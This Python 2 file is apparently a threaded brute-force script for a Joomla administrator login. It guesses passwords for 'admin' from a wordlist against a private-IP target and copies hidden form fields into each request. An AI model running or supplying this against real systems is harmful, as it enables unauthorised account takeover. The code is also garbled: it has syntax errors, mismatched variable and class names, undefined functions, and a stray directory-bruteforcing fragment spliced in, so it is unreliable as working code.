import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

# general settings
user_thread   = 10
username      = "admin"
wordList_file = "/tmp/cain.txt"
resume        = None

# target specific settings
target_url  = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"

class bruter(object):
    def_init_(self, username, words):

        self.username   = username
        self.password_q = words
        self.found = False

        print("Finished setting up for: %s" % username)

    def run_bruteforce(self):

        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))

            response = opener.open(target_url)

            page = response.read()print("Trying: %s: %s (%d left)" % (self.username,brute,self.password_q.qsize()))

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)

            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)

            login_result = login_response.read()

            if success check in login_result:
                self.found = True

                print("[*] Bruteforce successful.")
                print("[*] Username: %s" % username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for other threads to exit...")



class BruteParser(HTMLParser):
    def _init_(self):
        HTMLParser._init_(self)
        self.tag_results = {}

        def handle_starttag(self, tag, attrs):
            if tag == "input":
                tag_name = None
                tag_value = None
                for name,value in attrs:
                    if name == "name":
                        tag_name = value
                    if name == "value":
                        tag_value = value

                if tag_name is not None:
                    self.tag_results[tag_name] = value
word_queue = build_wordlist(wordlist_file)
extensions = [".php",".bak",".orig",".inc"]

for i in range(threads):
t = threading.Thread(target=dir_bruter,args=(word_queue,extensions,))
t.start()

words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()
